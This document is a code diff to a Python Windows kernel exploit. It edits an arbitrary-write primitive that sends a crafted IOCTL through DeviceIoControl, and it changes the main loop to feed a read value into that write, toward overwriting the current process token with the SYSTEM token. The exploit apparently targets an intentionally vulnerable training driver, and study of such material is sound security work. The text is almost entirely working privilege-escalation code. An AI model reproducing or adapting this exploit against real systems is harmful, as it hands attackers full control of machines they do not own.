@@ -177,7 +177,7 @@ def get_PsISP_kernel_address(kernel_base, img_name):
 
 ################################################### WRITE ###########################################################
 
-def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
+def writeQWORD(driver, what=0x4141414141414141, where=0x4242424242424242):
     what_addr = 0x000000001a001000 # Arbitrary offset inside baseadd
     # Write the what value to what_addr
     data = struct.pack("<Q", what)
@@ -191,9 +191,10 @@ def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
     data = struct.pack("<Q", what_addr) + struct.pack("<Q", where)
     dwStatus = kernel32.WriteProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a000000, data, len(data), byref(written))
     if dwStatus == 0:
-        print("Something went wrong while writing to memory in tehe packing section","e")
+        print("Something went wrong while writing to memory in the packing section","e")
         sys.exit()
     
+
     #IOCTL
     IoControlCode = 0x0022200B
     #Where
@@ -210,7 +211,6 @@ def writePrimitive(driver, what=0x4141414141414141, where=0x4242424242424242):
     print "Value before DeviceIoControl: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     triggerIOCTL = kernel32.DeviceIoControl(driver, IoControlCode, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, lpBytesReturned, NULL)
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
-    
     return triggerIOCTL
 
 ################################################### READ ###########################################################
@@ -368,7 +368,7 @@ def executeOverwrite():
 
         while True:
 
-            if counter > 5:
+            if counter > 2:
                 break
             counter+=1
 
@@ -382,10 +382,10 @@ def executeOverwrite():
 
             current_token = process_base_pointer + TOKEN_OFFSET
 
-
-            what=0x4141414141414141
-            where=0x4242424242424242
-            writePrimitive(driver, what, where)
+            whatStr = str(hex(read_value))
+            print "This is what in string format: " + whatStr
+            what = int((whatStr), 0)
+            writeQWORD(driver, what, 0x000000001a002000)
             # Write the system_token over our current_token for SYSTEM privileges.
             print "MAIN Attempting system to current token overwrite!"
 
